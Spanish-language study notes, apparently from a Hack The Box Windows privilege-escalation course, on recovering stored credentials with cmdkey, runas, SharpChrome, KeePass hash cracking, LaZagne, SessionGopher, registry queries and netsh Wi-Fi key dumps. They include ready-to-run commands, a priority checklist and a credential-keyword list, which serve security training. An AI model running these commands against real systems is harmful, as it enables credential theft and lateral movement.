
En Windows podemos encontrar credenciales almacenadas en el **Administrador de credenciales, navegadores, gestores de contraseñas, sesiones remotas, Registro de Windows y perfiles Wi-Fi**.

Estas credenciales pueden permitirnos:

- Escalar privilegios localmente.
    
- Acceder a otros equipos mediante movimiento lateral.
    
- Obtener acceso a cuentas privilegiadas de Active Directory.
    
- Acceder a servidores, bases de datos y aplicaciones internas.
    

---

## 1. Credenciales guardadas con Cmdkey

`cmdkey` permite administrar credenciales almacenadas en Windows.

### Enumerar credenciales guardadas

```
cmdkey /list
```

Ejemplo:

```
Target: LegacyGeneric:target=TERMSRV/SQL01
Type: Generic
User: inlanefreight\bob
```

**Interpretación:**

- `TERMSRV/SQL01`: credenciales almacenadas para una conexión RDP a `SQL01`.
    
- `inlanefreight\bob`: usuario asociado a esas credenciales.
    
- La contraseña no se muestra directamente.
    

### Reutilizar credenciales guardadas

Podemos intentar ejecutar comandos como el usuario cuyas credenciales están almacenadas:

```
runas /savecred /user:inlanefreight\bob "cmd.exe"
```

O abrir PowerShell:

```
runas /savecred /user:inlanefreight\bob "powershell.exe"
```

**Importante:** `/savecred` utiliza credenciales guardadas compatibles con `runas`. No significa que cualquier credencial mostrada por `cmdkey`, como una entrada `TERMSRV`, pueda utilizarse automáticamente con este comando.

Si las credenciales están guardadas para RDP, podemos intentar conectarnos al equipo correspondiente utilizando el cliente de Escritorio Remoto.

## 2. Credenciales guardadas en navegadores

Los navegadores pueden almacenar usuarios y contraseñas de aplicaciones web.

En el ejemplo de HTB se utiliza **SharpChrome** para recuperar credenciales guardadas en Google Chrome.

### Enumerar credenciales de Chrome

```
.\SharpChrome.exe logins /unprotect
```

Ejemplo:

```
URL: https://vc01.inlanefreight.local/ui
Username: bob@inlanefreight.local
Password: Welcome1
```

**Información obtenida:**

```
Aplicación: vCenter
Usuario: bob@inlanefreight.local
Contraseña: Welcome1
```

Estas credenciales podrían permitir acceder a aplicaciones internas o reutilizarse en otros servicios si el usuario emplea la misma contraseña.

### Consideraciones

- El descifrado depende del contexto del usuario y de los mecanismos de protección del navegador.
    
- No siempre es posible recuperar las contraseñas de otros usuarios.
    
- Las versiones y protecciones modernas de Chrome pueden impedir que herramientas antiguas funcionen correctamente.
    

**Detección:** el módulo menciona eventos como `4688`, `16385`, `4662` y `4663`, que pueden aportar información para investigar actividad relacionada con procesos, DPAPI y accesos a objetos o archivos.

## 3. Gestores de contraseñas — KeePass

Los gestores de contraseñas pueden almacenar credenciales de numerosos sistemas.

En el caso de **KeePass**, las bases de datos utilizan la extensión:

```
.kdbx
```

Pueden contener:

- Credenciales de administradores.
    
- Contraseñas de servidores.
    
- Usuarios de bases de datos.
    
- Credenciales de dispositivos de red.
    
- Accesos a aplicaciones internas.
    

### Buscar bases de datos KeePass

**PowerShell:**

```
Get-ChildItem C:\ -Recurse -Filter *.kdbx -ErrorAction SilentlyContinue
```

**CMD:**

```
where /R C:\ *.kdbx
```

También podemos encontrar estos archivos en recursos compartidos de red.

### Extraer el hash de KeePass

En el ejemplo del módulo, se utiliza `keepass2john.py`:

```
python2.7 keepass2john.py ILFREIGHT_Help_Desk.kdbx
```

El resultado contiene un hash que comienza por:

```
ILFREIGHT_Help_Desk:$keepass$*2*60000*...
```

El prefijo `ILFREIGHT_Help_Desk:` identifica el archivo y puede ser necesario eliminarlo según el formato esperado por la herramienta utilizada.

### Descifrar el hash con Hashcat

El módulo utiliza el modo `13400`:

```
hashcat -m 13400 keepass_hash /usr/share/wordlists/rockyou.txt
```

|Parámetro|Función|
|---|---|
|`-m 13400`|Modo de Hashcat para los formatos KeePass indicados en el módulo.|
|`keepass_hash`|Archivo que contiene el hash extraído.|
|`rockyou.txt`|Diccionario de contraseñas.|

Ejemplo de resultado:

```
Status: Cracked
Password: panther1
```

Si se recupera la contraseña maestra, podemos intentar abrir la base de datos KeePass.

**Importante:** el modo `13400` no sirve necesariamente para todas las versiones y configuraciones de KeePass. Hay que identificar el formato del hash generado.

## 4. Buscar credenciales en correos electrónicos

En entornos de Active Directory, los usuarios pueden haber recibido credenciales por correo electrónico.

El módulo menciona **MailSniper** para buscar información sensible en buzones de Microsoft Exchange a los que se tenga acceso.

### Palabras interesantes

```
password
pass
passwd
credentials
creds
secret
admin
```

Podemos encontrar:

- Contraseñas enviadas entre empleados.
    
- Credenciales temporales.
    
- Usuarios de aplicaciones internas.
    
- Accesos a servidores.
    
- Información sobre cuentas privilegiadas.

## 5. LaZagne — Recuperación de credenciales

**LaZagne** es una herramienta que busca credenciales almacenadas por distintas aplicaciones de Windows.

Puede recuperar información de:

- Navegadores.
    
- Clientes de correo.
    
- Bases de datos.
    
- Clientes de chat.
    
- Aplicaciones de administración.
    
- Gestores de credenciales de Windows.
    
- Configuraciones de AutoLogon.
    
- Otros mecanismos de almacenamiento compatibles.
    

### Mostrar la ayuda

```
.\lazagne.exe -h
```

### Ejecutar todos los módulos

```
.\lazagne.exe all
```

Ejemplo:

```
------------------- Winscp passwords -----------------

URL: transfer.inlanefreight.local
Login: root
Password: Summer2020!
Port: 22

------------------- Credman passwords -----------------

URL: dev01.dev.inlanefreight.local
Login: jordan_adm
Password: ! Q A Z z a q 1
```

En este ejemplo encontramos dos posibles vías de acceso:

**WinSCP:**

```
Host: transfer.inlanefreight.local
Usuario: root
Puerto: 22
```

**Windows Credential Manager:**

```
Host: dev01.dev.inlanefreight.local
Usuario: jordan_adm
```

### Ejecutar módulos específicos

En lugar de ejecutar todos los módulos, podemos seleccionar una categoría.

**Navegadores:**

```
.\lazagne.exe browsers
```

**Bases de datos:**

```
.\lazagne.exe databases
```

**Credenciales de Windows:**

```
.\lazagne.exe windows
```

**Herramientas de administración:**

```
.\lazagne.exe sysadmin
```

### Mostrar más información

```
.\lazagne.exe all -v
```

**Nota:** la recuperación de contraseñas depende de la aplicación, sus mecanismos de protección y los permisos del usuario que ejecuta LaZagne.

## 6. SessionGopher — Credenciales de sesiones remotas

**SessionGopher** permite enumerar información de sesiones guardadas en aplicaciones de acceso remoto.

Entre las aplicaciones compatibles mencionadas en el módulo están:

- PuTTY.
    
- WinSCP.
    
- FileZilla.
    
- SuperPuTTY.
    
- RDP.
    

También puede buscar archivos como:

```
.ppk
.rdp
.sdtid
```

### Importar SessionGopher

```
Import-Module .\SessionGopher.ps1
```

### Enumerar sesiones

```
Invoke-SessionGopher -Target WINLPE-SRV01
```

Ejemplo:

```
PuTTY Sessions

Session  : nix03
Hostname : nix03.inlanefreight.local
```

```
SuperPuTTY Sessions

SessionName : NIX03
Host        : nix03.inlanefreight.local
Username    : srvadmin
Port        : 22
```

**Información obtenida:**

```
Host: nix03.inlanefreight.local
Usuario: srvadmin
Puerto: 22
```

Aunque no aparezca una contraseña, podemos descubrir usuarios privilegiados y otros equipos interesantes.

### Permisos necesarios

- Como usuario estándar, podemos intentar enumerar nuestras propias sesiones.
    
- Como administrador local, podemos tener acceso a información de sesiones almacenadas por otros usuarios en `HKEY_USERS`.
    

**Importante:** una sesión guardada no implica necesariamente que exista una contraseña recuperable.

## 7. Credenciales almacenadas en el Registro de Windows

Algunas aplicaciones guardan credenciales directamente en el Registro.

Podemos utilizar `reg query` para enumerarlas manualmente.

### 7.1. Windows AutoLogon

AutoLogon permite iniciar sesión automáticamente en Windows utilizando una cuenta configurada previamente.

En determinadas configuraciones, la contraseña puede almacenarse en texto plano.

**Ruta:**

```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
```

### Enumerar AutoLogon

```
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

Valores interesantes:

|Valor|Significado|
|---|---|
|`AutoAdminLogon`|Indica si AutoLogon está habilitado.|
|`DefaultUserName`|Usuario configurado.|
|`DefaultPassword`|Contraseña, si está almacenada en texto plano.|

Ejemplo:

```
AutoAdminLogon    REG_SZ    1
DefaultUserName   REG_SZ    htb-student
DefaultPassword   REG_SZ    HTB_@cademy_stdnt!
```

**Información obtenida:**

```
Usuario: htb-student
Contraseña: HTB_@cademy_stdnt!
```

### Consultar únicamente los valores interesantes

```
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AutoAdminLogon
```

```
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
```

```
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
```

**Importante:** si `DefaultPassword` no aparece, no significa necesariamente que AutoLogon no esté configurado. Algunas implementaciones utilizan secretos LSA en lugar de almacenar la contraseña directamente en esa clave.

## 8. Credenciales de PuTTY en el Registro

PuTTY almacena información de las sesiones configuradas en el Registro de Windows.

**Ruta:**

```
HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions
```

### Enumerar sesiones guardadas

```
reg query "HKCU\SOFTWARE\SimonTatham\PuTTY\Sessions"
```

Ejemplo:

```
HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh
```

### Consultar una sesión

```
reg query "HKCU\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh"
```

Ejemplo:

```
ProxyHost        REG_SZ       proxy
ProxyPort        REG_DWORD    0x50
ProxyUsername    REG_SZ       administrator
ProxyPassword    REG_SZ       1_4m_th3_@cademy_4dm1n!
```

**Información obtenida:**

```
Usuario: administrator
Contraseña: 1_4m_th3_@cademy_4dm1n!
```

En este caso, las credenciales pertenecen a la **configuración del proxy**, no necesariamente al servidor SSH de destino.

### Diferencia entre HKCU y HKEY_USERS

- `HKCU`: Registro del usuario actual.
    
- `HKEY_USERS`: permite acceder a los hives de usuario que estén cargados y para los que tengamos permisos.
    

Para consultar configuraciones de otros usuarios, normalmente necesitaremos permisos adicionales.

## 9. Contraseñas Wi-Fi almacenadas

Windows puede almacenar perfiles de redes inalámbricas utilizadas anteriormente.

En determinados casos, podemos recuperar sus claves precompartidas.

### Enumerar perfiles Wi-Fi

```
netsh wlan show profile
```

Ejemplo:

```
All User Profile : Smith Cabin
All User Profile : Bob's iPhone
All User Profile : ilfreight_corp
```

### Recuperar la contraseña de una red

```
netsh wlan show profile name="ilfreight_corp" key=clear
```

Ejemplo:

```
SSID name       : ilfreight_corp
Authentication  : WPA2-Personal
Security key    : Present
Key Content     : ILFREIGHTWIFI-CORP123908!
```

**Información obtenida:**

```
SSID: ilfreight_corp
Contraseña: ILFREIGHTWIFI-CORP123908!
```

### Qué buscar

El campo importante es:

```
Key Content
```

Si aparece, contiene la clave de la red inalámbrica.

**Importante:**

- Puede ser necesario disponer de privilegios de administrador para mostrar determinadas claves.
    
- No todas las redes utilizan contraseñas precompartidas.
    
- En redes empresariales con autenticación 802.1X, este procedimiento no revela necesariamente las credenciales del usuario.

## Resumen rápido

|Técnica|Comando / Herramienta|Qué podemos obtener|
|---|---|---|
|Credenciales guardadas|`cmdkey /list`|Usuarios y destinos asociados a credenciales almacenadas.|
|Reutilización de credenciales|`runas /savecred`|Ejecución como otro usuario cuando existen credenciales compatibles.|
|Navegadores|SharpChrome|Credenciales guardadas de Chrome.|
|Gestores de contraseñas|KeePass + Hashcat|Posible acceso a bases de datos `.kdbx`.|
|Correos electrónicos|MailSniper|Posibles credenciales enviadas por correo.|
|Recuperación automatizada|LaZagne|Credenciales de aplicaciones compatibles.|
|Sesiones remotas|SessionGopher|Usuarios, hosts y posibles contraseñas guardadas.|
|Windows AutoLogon|`reg query`|Usuarios y posibles contraseñas en el Registro.|
|PuTTY|`reg query`|Configuraciones y posibles credenciales de proxy.|
|Redes inalámbricas|`netsh wlan`|Perfiles y claves Wi-Fi almacenadas.|

### Prioridad de enumeración

1. Ejecutar `cmdkey /list` para identificar credenciales guardadas.
    
2. Revisar `Winlogon` para localizar posibles contraseñas de AutoLogon.
    
3. Enumerar sesiones de PuTTY y otras aplicaciones de acceso remoto.
    
4. Buscar archivos `.kdbx` de KeePass.
    
5. Revisar credenciales de navegadores y aplicaciones compatibles con LaZagne.
    
6. Utilizar SessionGopher para identificar sesiones remotas guardadas.
    
7. Si el equipo utiliza Wi-Fi, revisar sus perfiles almacenados.
    

**Clave para el examen:** encontrar una contraseña no significa que sea de administrador. Hay que identificar el usuario, el sistema al que pertenece y los privilegios asociados para determinar si permite escalar privilegios o realizar movimiento lateral.
